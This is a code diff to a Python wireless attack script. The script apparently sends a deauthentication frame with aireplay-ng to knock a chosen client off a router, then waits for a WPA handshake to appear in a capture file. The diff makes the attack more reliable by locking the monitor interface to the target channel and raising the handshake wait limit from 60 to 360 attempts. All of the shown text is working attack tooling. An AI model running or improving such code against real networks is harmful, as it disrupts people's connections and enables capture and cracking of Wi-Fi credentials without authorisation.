@@ -349,6 +349,12 @@ def start(interfaces):
                 f"{PINK}[Router:{RESET} {CYAN}{mac_rot}{RESET}{PINK} | Client: {RESET}{CYAN}{mac_cli}{RESET}{PINK} | Channel:{RESET}{CYAN} {channel}]"
             )
 
+            logging.info(f"{PINK}Locking {RESET}{CYAN}{monitor_wnic}{RESET}{PINK} to channel {RESET}{CYAN}{channel}{RESET}{PINK}...")
+
+            run_command(f"iwconfig {monitor_wnic} channel {channel}")
+
+            time.sleep(1)
+
             logging.info(
                 f"{PINK}Deauthenticating ->{RESET} {CYAN}aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_wnic}"
             )
@@ -375,7 +381,7 @@ def start(interfaces):
             )
 
             handshake_captured = False
-            max_wait_attempts = 60
+            max_wait_attempts = 360
             attempt = 0
 
             file_to_check = f"{cap_file}-01.cap"
